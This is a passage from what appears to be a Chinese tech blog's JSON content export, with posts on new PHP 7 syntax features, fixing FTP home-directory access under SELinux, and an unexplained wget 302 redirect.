&lt;=&gt; 1; // 0\necho 1 &lt;=&gt; 2; // -1\necho 2 &lt;=&gt; 1; // 1</pre>\n\n现在它可以简化上面一串if else的写法了\n\n<pre>switch ($a  &lt;=&gt; $b)\n{\n    case 1:\n    break;\n    case 0:\n    break;\n    case -1:\n    break;\n}</pre>\n\n这样是不是更清爽．上面的只是示例，也可以按需求用其它逻辑实现\n\n> wiki [https://wiki.php.net/rfc/combined-comparison-operator](https://wiki.php.net/rfc/combined-comparison-operator)\n\n### Anonymous Classes\n\n### 匿名类\n\n不需要给类命名，这和匿名函数类似\n\n示例代码\n\n<pre class=\"code php\">&lt;?php\n/* implementing an anonymous console object from your framework maybe */\n(new class extends ConsoleProgram {\n    public function main() {\n       /* ... */\n    }\n})-&gt;main();</pre>\n\n> wiki: [https://wiki.php.net/rfc/anonymous_classes](https://wiki.php.net/rfc/anonymous_classes)\n\n&nbsp;","source":"_posts/php7-e6-96-b0-e7-89-b9-e6-80-a7.md","raw":"---\ntitle: PHP7语法新特性\nid: 89\ncategories:\n  - php\ndate: 2015-06-15 23:15:24\ntags:\n---\n\n# 这篇文章已经过时了\n\n这是半年前对alpha版本写的，现在PHP7正式版已经发布了，功能上又有所调整。下面是中文的官方文档，推荐阅读：\n\n> [http://php.net/manual/zh/migration70.new-features.php](http://php.net/manual/zh/migration70.new-features.php)\n\nPS：官方文档还有一小部分没有翻译完，可以阅读完整的中文翻译版本：\n\n> [https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md](https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md)\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n===================== 时间分割线 ========================\n&nbsp;\n\n前几周PHP 7.0.0 Alpha 1发布了\n\n> ## [PHP 7.0.0 Alpha 1 Released](http://php.net/archive/2015.php#id2015-01-11-6)\n\nPHP7在性能上有很大提升，然而不止这些．[ChangeLog](http://php.net/archive/2015.php#id2015-01-11-6)上还有一些重要的变化，可以说PHP变得更加面向对象了\n\n### Many fatal errors are now Exceptions\n\n### 许多致命错误改为抛出异常\n\n这绝对的是最重要的改变，如果PHP5的程序出现fatal errors，补救是很麻烦的，很多服务直接终止并响应500错误码．而过去只能依靠 `register_shutdown_function()` 来做一些事后的处理．\n\n现在如果用异常来表示，就可以很方便的捕获并按预定方案处理．\n\n> wiki: [https://wiki.php.net/rfc/engine_exceptions_for_php7](https://wiki.php.net/rfc/engine_exceptions_for_php7)\n\n### Return Type Declarations\n\n### 返回值类型声明\n\n可以通过函数名后加入 **[: _type_]** 来声明返回值的类型了，这一点改变是有必要的．大多数方法都只提供单一类型的返回值，通过这里的声明可以及时避免错误，让代码更严谨．\n\n#### 示例：限定返回array类型\n\n<pre class=\"code php\">function foo(): array {\n    return [];\n}</pre>\n\n> wiki [https://wiki.php.net/rfc/return_types](https://wiki.php.net/rfc/return_types)\n\n### Scalar Type Declarations\n\n### 标量类型声明\n\n参数或返回值只要是标量`string, int, float, boolean`，也可以像上面一样限定为单一类型．而当前PHP5只可以限定`array`和`object`类型的参数了．\n\n#### 示例用法：限制参数为int类型\n\n<pre class=\"code file php\">function add(int $a, int $b): string {\n    return $a . $b;\n}</pre>\n\n标量声明的主要作用是自动实现参数的强制类型转换．不然很多时候我们要在代码里写很多 (int) (bool)\n\n#### 自动转换示例\n\n<pre class=\"code file php\">var_dump(add(1, \"2a\")); // string(\"12\")</pre>\n\n> wiki [https://wiki.php.net/rfc/scalar_type_hints_v5](https://wiki.php.net/rfc/scalar_type_hints_v5)\n\n### Null Coalesce Operator\n\n### 空值运算符\n\n这是专门判断空值的操作符，示例代码：\n获取GET参数user，如果参数不存在，则默认值是nobody\n\n<pre class=\"code php\">$username = $_GET['user'] ?? 'nobody';</pre>\n\n上面的代码等同于PHP5的:\n\n<pre class=\"code php\">$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';</pre>\n\n以后判断请求参数取默认值就方便多了\n\n> wiki: [https://wiki.php.net/rfc/isset_ternary](https://wiki.php.net/rfc/isset_ternary)\n\n### Combined comparison Operator (&lt;=&gt;)\n\n### 合并比较运算符\n\n以前我们比较大小经常用这种写法\n\n<pre>$a = 1;\n$b = 2;\n\nif ($a &gt; $b) {\n    echo 1;\n} elseif ($a == $b) {\n    echo 0;\n} else {\n    echo -1;\n}</pre>\n\n新的 **&lt;=&gt;** 运算符也是起到这个作用\n\n<pre class=\"code php\">echo 1 &lt;=&gt; 1; // 0\necho 1 &lt;=&gt; 2; // -1\necho 2 &lt;=&gt; 1; // 1</pre>\n\n现在它可以简化上面一串if else的写法了\n\n<pre>switch ($a  &lt;=&gt; $b)\n{\n    case 1:\n    break;\n    case 0:\n    break;\n    case -1:\n    break;\n}</pre>\n\n这样是不是更清爽．上面的只是示例，也可以按需求用其它逻辑实现\n\n> wiki [https://wiki.php.net/rfc/combined-comparison-operator](https://wiki.php.net/rfc/combined-comparison-operator)\n\n### Anonymous Classes\n\n### 匿名类\n\n不需要给类命名，这和匿名函数类似\n\n示例代码\n\n<pre class=\"code php\">&lt;?php\n/* implementing an anonymous console object from your framework maybe */\n(new class extends ConsoleProgram {\n    public function main() {\n       /* ... */\n    }\n})-&gt;main();</pre>\n\n> wiki: [https://wiki.php.net/rfc/anonymous_classes](https://wiki.php.net/rfc/anonymous_classes)\n\n&nbsp;","slug":"php7-e6-96-b0-e7-89-b9-e6-80-a7","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cil900ghgmlmthzgrs3c","content":"<h1 id=\"这篇文章已经过时了\"><a href=\"#这篇文章已经过时了\" class=\"headerlink\" title=\"这篇文章已经过时了\"></a>这篇文章已经过时了</h1><p>这是半年前对alpha版本写的，现在PHP7正式版已经发布了，功能上又有所调整。下面是中文的官方文档，推荐阅读：</p>\n<blockquote>\n<p><a href=\"http://php.net/manual/zh/migration70.new-features.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/migration70.new-features.php</a></p>\n</blockquote>\n<p>PS：官方文档还有一小部分没有翻译完，可以阅读完整的中文翻译版本：</p>\n<blockquote>\n<p><a href=\"https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md\" target=\"_blank\" rel=\"noopener\">https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md</a></p>\n</blockquote>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;<br>===================== 时间分割线 ========================<br>&nbsp;</p>\n<p>前几周PHP 7.0.0 Alpha 1发布了</p>\n<blockquote>\n<h2 id=\"PHP-7-0-0-Alpha-1-Released\"><a href=\"#PHP-7-0-0-Alpha-1-Released\" class=\"headerlink\" title=\"PHP 7.0.0 Alpha 1 Released\"></a><a href=\"http://php.net/archive/2015.php#id2015-01-11-6\" target=\"_blank\" rel=\"noopener\">PHP 7.0.0 Alpha 1 Released</a></h2></blockquote>\n<p>PHP7在性能上有很大提升，然而不止这些．<a href=\"http://php.net/archive/2015.php#id2015-01-11-6\" target=\"_blank\" rel=\"noopener\">ChangeLog</a>上还有一些重要的变化，可以说PHP变得更加面向对象了</p>\n<h3 id=\"Many-fatal-errors-are-now-Exceptions\"><a href=\"#Many-fatal-errors-are-now-Exceptions\" class=\"headerlink\" title=\"Many fatal errors are now Exceptions\"></a>Many fatal errors are now Exceptions</h3><h3 id=\"许多致命错误改为抛出异常\"><a href=\"#许多致命错误改为抛出异常\" class=\"headerlink\" title=\"许多致命错误改为抛出异常\"></a>许多致命错误改为抛出异常</h3><p>这绝对的是最重要的改变，如果PHP5的程序出现fatal errors，补救是很麻烦的，很多服务直接终止并响应500错误码．而过去只能依靠 <code>register_shutdown_function()</code> 来做一些事后的处理．</p>\n<p>现在如果用异常来表示，就可以很方便的捕获并按预定方案处理．</p>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/engine_exceptions_for_php7\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/engine_exceptions_for_php7</a></p>\n</blockquote>\n<h3 id=\"Return-Type-Declarations\"><a href=\"#Return-Type-Declarations\" class=\"headerlink\" title=\"Return Type Declarations\"></a>Return Type Declarations</h3><h3 id=\"返回值类型声明\"><a href=\"#返回值类型声明\" class=\"headerlink\" title=\"返回值类型声明\"></a>返回值类型声明</h3><p>可以通过函数名后加入 <strong>[: <em>type</em>]</strong> 来声明返回值的类型了，这一点改变是有必要的．大多数方法都只提供单一类型的返回值，通过这里的声明可以及时避免错误，让代码更严谨．</p>\n<h4 id=\"示例：限定返回array类型\"><a href=\"#示例：限定返回array类型\" class=\"headerlink\" title=\"示例：限定返回array类型\"></a>示例：限定返回array类型</h4><pre class=\"code php\">function foo(): array {\n    return [];\n}</pre>\n\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/return_types\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/return_types</a></p>\n</blockquote>\n<h3 id=\"Scalar-Type-Declarations\"><a href=\"#Scalar-Type-Declarations\" class=\"headerlink\" title=\"Scalar Type Declarations\"></a>Scalar Type Declarations</h3><h3 id=\"标量类型声明\"><a href=\"#标量类型声明\" class=\"headerlink\" title=\"标量类型声明\"></a>标量类型声明</h3><p>参数或返回值只要是标量<code>string, int, float, boolean</code>，也可以像上面一样限定为单一类型．而当前PHP5只可以限定<code>array</code>和<code>object</code>类型的参数了．</p>\n<h4 id=\"示例用法：限制参数为int类型\"><a href=\"#示例用法：限制参数为int类型\" class=\"headerlink\" title=\"示例用法：限制参数为int类型\"></a>示例用法：限制参数为int类型</h4><pre class=\"code file php\">function add(int $a, int $b): string {\n    return $a . $b;\n}</pre>\n\n<p>标量声明的主要作用是自动实现参数的强制类型转换．不然很多时候我们要在代码里写很多 (int) (bool)</p>\n<h4 id=\"自动转换示例\"><a href=\"#自动转换示例\" class=\"headerlink\" title=\"自动转换示例\"></a>自动转换示例</h4><pre class=\"code file php\">var_dump(add(1, \"2a\")); // string(\"12\")</pre>\n\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/scalar_type_hints_v5\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/scalar_type_hints_v5</a></p>\n</blockquote>\n<h3 id=\"Null-Coalesce-Operator\"><a href=\"#Null-Coalesce-Operator\" class=\"headerlink\" title=\"Null Coalesce Operator\"></a>Null Coalesce Operator</h3><h3 id=\"空值运算符\"><a href=\"#空值运算符\" class=\"headerlink\" title=\"空值运算符\"></a>空值运算符</h3><p>这是专门判断空值的操作符，示例代码：<br>获取GET参数user，如果参数不存在，则默认值是nobody</p>\n<pre class=\"code php\">$username = $_GET['user'] ?? 'nobody';</pre>\n\n<p>上面的代码等同于PHP5的:</p>\n<pre class=\"code php\">$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';</pre>\n\n<p>以后判断请求参数取默认值就方便多了</p>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/isset_ternary\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/isset_ternary</a></p>\n</blockquote>\n<h3 id=\"Combined-comparison-Operator-lt-gt\"><a href=\"#Combined-comparison-Operator-lt-gt\" class=\"headerlink\" title=\"Combined comparison Operator (&lt;=&gt;)\"></a>Combined comparison Operator (&lt;=&gt;)</h3><h3 id=\"合并比较运算符\"><a href=\"#合并比较运算符\" class=\"headerlink\" title=\"合并比较运算符\"></a>合并比较运算符</h3><p>以前我们比较大小经常用这种写法</p>\n<pre>$a = 1;\n$b = 2;\n\nif ($a &gt; $b) {\n    echo 1;\n} elseif ($a == $b) {\n    echo 0;\n} else {\n    echo -1;\n}</pre>\n\n<p>新的 <strong>&lt;=&gt;</strong> 运算符也是起到这个作用</p>\n<pre class=\"code php\">echo 1 &lt;=&gt; 1; // 0\necho 1 &lt;=&gt; 2; // -1\necho 2 &lt;=&gt; 1; // 1</pre>\n\n<p>现在它可以简化上面一串if else的写法了</p>\n<pre>switch ($a  &lt;=&gt; $b)\n{\n    case 1:\n    break;\n    case 0:\n    break;\n    case -1:\n    break;\n}</pre>\n\n<p>这样是不是更清爽．上面的只是示例，也可以按需求用其它逻辑实现</p>\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/combined-comparison-operator\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/combined-comparison-operator</a></p>\n</blockquote>\n<h3 id=\"Anonymous-Classes\"><a href=\"#Anonymous-Classes\" class=\"headerlink\" title=\"Anonymous Classes\"></a>Anonymous Classes</h3><h3 id=\"匿名类\"><a href=\"#匿名类\" class=\"headerlink\" title=\"匿名类\"></a>匿名类</h3><p>不需要给类命名，这和匿名函数类似</p>\n<p>示例代码</p>\n<pre class=\"code php\">&lt;?php\n/* implementing an anonymous console object from your framework maybe */\n(new class extends ConsoleProgram {\n    public function main() {\n       /* ... */\n    }\n})-&gt;main();</pre>\n\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/anonymous_classes\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/anonymous_classes</a></p>\n</blockquote>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"这篇文章已经过时了\"><a href=\"#这篇文章已经过时了\" class=\"headerlink\" title=\"这篇文章已经过时了\"></a>这篇文章已经过时了</h1><p>这是半年前对alpha版本写的，现在PHP7正式版已经发布了，功能上又有所调整。下面是中文的官方文档，推荐阅读：</p>\n<blockquote>\n<p><a href=\"http://php.net/manual/zh/migration70.new-features.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/migration70.new-features.php</a></p>\n</blockquote>\n<p>PS：官方文档还有一小部分没有翻译完，可以阅读完整的中文翻译版本：</p>\n<blockquote>\n<p><a href=\"https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md\" target=\"_blank\" rel=\"noopener\">https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md</a></p>\n</blockquote>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;<br>===================== 时间分割线 ========================<br>&nbsp;</p>\n<p>前几周PHP 7.0.0 Alpha 1发布了</p>\n<blockquote>\n<h2 id=\"PHP-7-0-0-Alpha-1-Released\"><a href=\"#PHP-7-0-0-Alpha-1-Released\" class=\"headerlink\" title=\"PHP 7.0.0 Alpha 1 Released\"></a><a href=\"http://php.net/archive/2015.php#id2015-01-11-6\" target=\"_blank\" rel=\"noopener\">PHP 7.0.0 Alpha 1 Released</a></h2></blockquote>\n<p>PHP7在性能上有很大提升，然而不止这些．<a href=\"http://php.net/archive/2015.php#id2015-01-11-6\" target=\"_blank\" rel=\"noopener\">ChangeLog</a>上还有一些重要的变化，可以说PHP变得更加面向对象了</p>\n<h3 id=\"Many-fatal-errors-are-now-Exceptions\"><a href=\"#Many-fatal-errors-are-now-Exceptions\" class=\"headerlink\" title=\"Many fatal errors are now Exceptions\"></a>Many fatal errors are now Exceptions</h3><h3 id=\"许多致命错误改为抛出异常\"><a href=\"#许多致命错误改为抛出异常\" class=\"headerlink\" title=\"许多致命错误改为抛出异常\"></a>许多致命错误改为抛出异常</h3><p>这绝对的是最重要的改变，如果PHP5的程序出现fatal errors，补救是很麻烦的，很多服务直接终止并响应500错误码．而过去只能依靠 <code>register_shutdown_function()</code> 来做一些事后的处理．</p>\n<p>现在如果用异常来表示，就可以很方便的捕获并按预定方案处理．</p>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/engine_exceptions_for_php7\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/engine_exceptions_for_php7</a></p>\n</blockquote>\n<h3 id=\"Return-Type-Declarations\"><a href=\"#Return-Type-Declarations\" class=\"headerlink\" title=\"Return Type Declarations\"></a>Return Type Declarations</h3><h3 id=\"返回值类型声明\"><a href=\"#返回值类型声明\" class=\"headerlink\" title=\"返回值类型声明\"></a>返回值类型声明</h3><p>可以通过函数名后加入 <strong>[: <em>type</em>]</strong> 来声明返回值的类型了，这一点改变是有必要的．大多数方法都只提供单一类型的返回值，通过这里的声明可以及时避免错误，让代码更严谨．</p>\n<h4 id=\"示例：限定返回array类型\"><a href=\"#示例：限定返回array类型\" class=\"headerlink\" title=\"示例：限定返回array类型\"></a>示例：限定返回array类型</h4><pre class=\"code php\">function foo(): array {\n    return [];\n}</pre>\n\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/return_types\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/return_types</a></p>\n</blockquote>\n<h3 id=\"Scalar-Type-Declarations\"><a href=\"#Scalar-Type-Declarations\" class=\"headerlink\" title=\"Scalar Type Declarations\"></a>Scalar Type Declarations</h3><h3 id=\"标量类型声明\"><a href=\"#标量类型声明\" class=\"headerlink\" title=\"标量类型声明\"></a>标量类型声明</h3><p>参数或返回值只要是标量<code>string, int, float, boolean</code>，也可以像上面一样限定为单一类型．而当前PHP5只可以限定<code>array</code>和<code>object</code>类型的参数了．</p>\n<h4 id=\"示例用法：限制参数为int类型\"><a href=\"#示例用法：限制参数为int类型\" class=\"headerlink\" title=\"示例用法：限制参数为int类型\"></a>示例用法：限制参数为int类型</h4><pre class=\"code file php\">function add(int $a, int $b): string {\n    return $a . $b;\n}</pre>\n\n<p>标量声明的主要作用是自动实现参数的强制类型转换．不然很多时候我们要在代码里写很多 (int) (bool)</p>\n<h4 id=\"自动转换示例\"><a href=\"#自动转换示例\" class=\"headerlink\" title=\"自动转换示例\"></a>自动转换示例</h4><pre class=\"code file php\">var_dump(add(1, \"2a\")); // string(\"12\")</pre>\n\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/scalar_type_hints_v5\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/scalar_type_hints_v5</a></p>\n</blockquote>\n<h3 id=\"Null-Coalesce-Operator\"><a href=\"#Null-Coalesce-Operator\" class=\"headerlink\" title=\"Null Coalesce Operator\"></a>Null Coalesce Operator</h3><h3 id=\"空值运算符\"><a href=\"#空值运算符\" class=\"headerlink\" title=\"空值运算符\"></a>空值运算符</h3><p>这是专门判断空值的操作符，示例代码：<br>获取GET参数user，如果参数不存在，则默认值是nobody</p>\n<pre class=\"code php\">$username = $_GET['user'] ?? 'nobody';</pre>\n\n<p>上面的代码等同于PHP5的:</p>\n<pre class=\"code php\">$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';</pre>\n\n<p>以后判断请求参数取默认值就方便多了</p>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/isset_ternary\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/isset_ternary</a></p>\n</blockquote>\n<h3 id=\"Combined-comparison-Operator-lt-gt\"><a href=\"#Combined-comparison-Operator-lt-gt\" class=\"headerlink\" title=\"Combined comparison Operator (&lt;=&gt;)\"></a>Combined comparison Operator (&lt;=&gt;)</h3><h3 id=\"合并比较运算符\"><a href=\"#合并比较运算符\" class=\"headerlink\" title=\"合并比较运算符\"></a>合并比较运算符</h3><p>以前我们比较大小经常用这种写法</p>\n<pre>$a = 1;\n$b = 2;\n\nif ($a &gt; $b) {\n    echo 1;\n} elseif ($a == $b) {\n    echo 0;\n} else {\n    echo -1;\n}</pre>\n\n<p>新的 <strong>&lt;=&gt;</strong> 运算符也是起到这个作用</p>\n<pre class=\"code php\">echo 1 &lt;=&gt; 1; // 0\necho 1 &lt;=&gt; 2; // -1\necho 2 &lt;=&gt; 1; // 1</pre>\n\n<p>现在它可以简化上面一串if else的写法了</p>\n<pre>switch ($a  &lt;=&gt; $b)\n{\n    case 1:\n    break;\n    case 0:\n    break;\n    case -1:\n    break;\n}</pre>\n\n<p>这样是不是更清爽．上面的只是示例，也可以按需求用其它逻辑实现</p>\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/combined-comparison-operator\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/combined-comparison-operator</a></p>\n</blockquote>\n<h3 id=\"Anonymous-Classes\"><a href=\"#Anonymous-Classes\" class=\"headerlink\" title=\"Anonymous Classes\"></a>Anonymous Classes</h3><h3 id=\"匿名类\"><a href=\"#匿名类\" class=\"headerlink\" title=\"匿名类\"></a>匿名类</h3><p>不需要给类命名，这和匿名函数类似</p>\n<p>示例代码</p>\n<pre class=\"code php\">&lt;?php\n/* implementing an anonymous console object from your framework maybe */\n(new class extends ConsoleProgram {\n    public function main() {\n       /* ... */\n    }\n})-&gt;main();</pre>\n\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/anonymous_classes\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/anonymous_classes</a></p>\n</blockquote>\n<p>&nbsp;</p>\n"},{"title":"SELINUX下ftp权限修正","id":"103","date":"2015-06-20T06:02:58.000Z","_content":"\n在**SELINUX**模式下（redhat系列才有），ftp无法访问home目录，即便是自己的也不行．\n\nftp错误: 226 Transfer done (but failed to open directory).\n<pre>ftp&gt; ls\n227 Entering Passive Mode (10,240,254,73,22,229).\n150 Here comes the directory listing.\n226 Transfer done (but failed to open directory).</pre>\n有两种解决办法：\n\n### 1\\. 配置SELINUX允许访问home目录\n\n<pre># setsebool -P allow_ftpd_full_access on\n# setsebool -P ftp_home_dir on\n</pre>\n\n### 2\\. 彻底关闭SELINUX，这个不太好\n\n<pre># vi /etc/selinux/config\n+ SELINUX=disabled\n# reboot\n</pre>\n这个还需要重启机器","source":"_posts/selinux-e4-b8-8bftp-e6-9d-83-e9-99-90-e4-bf-ae-e6-ad-a3.md","raw":"---\ntitle: SELINUX下ftp权限修正\nid: 103\ncategories:\n  - linux\ndate: 2015-06-20 14:02:58\ntags:\n---\n\n在**SELINUX**模式下（redhat系列才有），ftp无法访问home目录，即便是自己的也不行．\n\nftp错误: 226 Transfer done (but failed to open directory).\n<pre>ftp&gt; ls\n227 Entering Passive Mode (10,240,254,73,22,229).\n150 Here comes the directory listing.\n226 Transfer done (but failed to open directory).</pre>\n有两种解决办法：\n\n### 1\\. 配置SELINUX允许访问home目录\n\n<pre># setsebool -P allow_ftpd_full_access on\n# setsebool -P ftp_home_dir on\n</pre>\n\n### 2\\. 彻底关闭SELINUX，这个不太好\n\n<pre># vi /etc/selinux/config\n+ SELINUX=disabled\n# reboot\n</pre>\n这个还需要重启机器","slug":"selinux-e4-b8-8bftp-e6-9d-83-e9-99-90-e4-bf-ae-e6-ad-a3","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cilb00gjgmlmeac55492","content":"<p>在<strong>SELINUX</strong>模式下（redhat系列才有），ftp无法访问home目录，即便是自己的也不行．</p>\n<p>ftp错误: 226 Transfer done (but failed to open directory).</p>\n<pre>ftp&gt; ls\n227 Entering Passive Mode (10,240,254,73,22,229).\n150 Here comes the directory listing.\n226 Transfer done (but failed to open directory).</pre>\n有两种解决办法：\n\n### 1\\. 配置SELINUX允许访问home目录\n\n<pre># setsebool -P allow_ftpd_full_access on\n# setsebool -P ftp_home_dir on\n</pre>\n\n<h3 id=\"2-彻底关闭SELINUX，这个不太好\"><a href=\"#2-彻底关闭SELINUX，这个不太好\" class=\"headerlink\" title=\"2. 彻底关闭SELINUX，这个不太好\"></a>2. 彻底关闭SELINUX，这个不太好</h3><p><pre># vi /etc/selinux/config</pre></p>\n<ul>\n<li>SELINUX=disabled<h1 id=\"reboot\"><a href=\"#reboot\" class=\"headerlink\" title=\"reboot\"></a>reboot</h1><br>这个还需要重启机器</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>在<strong>SELINUX</strong>模式下（redhat系列才有），ftp无法访问home目录，即便是自己的也不行．</p>\n<p>ftp错误: 226 Transfer done (but failed to open directory).</p>\n<pre>ftp&gt; ls\n227 Entering Passive Mode (10,240,254,73,22,229).\n150 Here comes the directory listing.\n226 Transfer done (but failed to open directory).</pre>\n有两种解决办法：\n\n### 1\\. 配置SELINUX允许访问home目录\n\n<pre># setsebool -P allow_ftpd_full_access on\n# setsebool -P ftp_home_dir on\n</pre>\n\n<h3 id=\"2-彻底关闭SELINUX，这个不太好\"><a href=\"#2-彻底关闭SELINUX，这个不太好\" class=\"headerlink\" title=\"2. 彻底关闭SELINUX，这个不太好\"></a>2. 彻底关闭SELINUX，这个不太好</h3><p><pre># vi /etc/selinux/config</pre></p>\n<ul>\n<li>SELINUX=disabled<h1 id=\"reboot\"><a href=\"#reboot\" class=\"headerlink\" title=\"reboot\"></a>reboot</h1><br>这个还需要重启机器</li>\n</ul>\n"},{"title":"wget莫名其妙的跳转","id":"127","date":"2015-07-15T07:34:06.000Z","_content":"\n尝试从自己的服务器下载一些包文件，服务端也正常响应200，但wget却奇怪的收到302跳转请求。\n\n客户端下载的命令\n<pre class=\"\">$ wget http://package.xiaoai.me/php-5.6.10.tar.gz --no-cache --no-dns-cache\n--2015-07-15 15:24:37--  http://package.xiaoai.me/php-5.6.10.tar.gz\n正在解析主机 package.xiaoai.me (package.xiaoai.me)... 104.155.200.103\n正在连接 package.xiaoai.me (package.xiaoai.me)|104.155.200.103|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 302 Found\n位置：http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz [跟随至新的 URL]\n--2015-07-15 15:24:37--  http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz\n正在连接 124.205.69.137:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：18306403 (17M) [application/octet-stream]\n正在保存至: “php-5.6.10.tar.gz.2”\n\nphp-5.6.10.tar.gz.2  82%[=================&gt;    ]  14.45M  3.59MB/s   eta 1s    \n</pre>\n刚开始没注意，还以为国外的服务器速度这么快，原来是跳转了。\n\n而服务端的nginx的配置，就是一个普通网站\n<pre class=\"\">server {\n    listen 80;\n    server_name package.xiaoai.me;\n    root /srv/package;\n\n    access_log logs/package.xiaoai.me.access.log;\n\n    location / {\n        index index.html;\n    }\n}\n</pre>\nnginx的日志显示的是200，不是302:\n<pre>xx.xx.xx.xx - - [15/Jul/2015:15:24:37 +0800] \"GET /php-5.6.10.tar.gz HTTP/1.1\" 200 15488 \"-\" \"Wget/1.16.1 (linux-gnu)\"\n</pre>\n&nbsp;\n\n那这个302从哪里来的，未解之迷。暂时记录下，有时间看看","source":"_posts/wget-e8-8e-ab-e5-90-8d-e5-85-b6-e5-a6-99-e7-9a-84-e8-b7-b3-e8-bd-ac.md","raw":"---\ntitle: wget莫名其妙的跳转\nid: 127\ncategories:\n  - linux\ndate: 2015-07-15 15:34:06\ntags:\n---\n\n尝试从自己的服务器下载一些包文件，服务端也正常响应200，但wget却奇怪的收到302跳转请求。\n\n客户端下载的命令\n<pre class=\"\">$ wget http://package.xiaoai.me/php-5.6.10.tar.gz --no-cache --no-dns-cache\n--2015-07-15 15:24:37--  http://package.xiaoai.me/php-5.6.10.tar.gz\n正在解析主机 package.xiaoai.me (package.xiaoai.me)... 104.155.200.103\n正在连接 package.xiaoai.me (package.xiaoai.me)|104.155.200.103|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 302 Found\n位置：http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz [跟随至新的 URL]\n--2015-07-15 15:24:37--  http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz\n正在连接 124.205.69.137:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：18306403 (17M) [application/octet-stream]\n正在保存至: “php-5.6.10.tar.gz.2”\n\nphp-5.6.10.tar.gz.2  82%[=================&gt;    ]  14.45M  3.59MB/s   eta 1s    \n</pre>\n刚开始没注意，还以为国外的服务器速度这么快，原来是跳转了。\n\n而服务端的nginx的配置，就是一个普通网站\n<pre class=\"\">server {\n    listen 80;\n    server_name package.xiaoai.me;\n    root /srv/package;\n\n    access_log logs/package.xiaoai.me.access.log;\n\n    location / {\n        index index.html;\n    }\n}\n</pre>\nnginx的日志显示的是200，不是302:\n<pre>xx.xx.xx.xx - - [15/Jul/2015:15:24:37 +0800] \"GET /php-5.6.10.tar.gz HTTP/1.1\" 200 15488 \"-\" \"Wget/1.16.1 (linux-gnu)\"\n</pre>\n&nbsp;\n\n那这个302从哪里来的，未解之迷。暂时记录下，有时间看看","slug":"wget-e8-8e-ab-e5-90-8d-e5-85-b6-e5-a6-99-e7-9a-84-e8-b7-b3-e8-bd-ac","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cild00glgmlme45nvar1","content":"<p>尝试从自己的服务器下载一些包文件，服务端也正常响应200，但wget却奇怪的收到302跳转请求。</p>\n<p>客户端下载的命令</p>\n<p><pre class=\"\">$ wget <a href=\"http://package.xiaoai.me/php-5.6.10.tar.gz\" target=\"_blank\" rel=\"noopener\">http://package.xiaoai.me/php-5.6.10.tar.gz</a> –no-cache –no-dns-cache<br>–2015-07-15 15:24:37–  <a href=\"http://package.xiaoai.me/php-5.6.10.tar.gz\" target=\"_blank\" rel=\"noopener\">http://package.xiaoai.me/php-5.6.10.tar.gz</a><br>正在解析主机 package.xiaoai.me (package.xiaoai.me)… 104.155.200.103<br>正在连接 package.xiaoai.me (package.xiaoai.me)|104.155.200.103|:80… 已连接。<br>已发出 HTTP 请求，正在等待回应… 302 Found<br>位置：<a href=\"http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz\" target=\"_blank\" 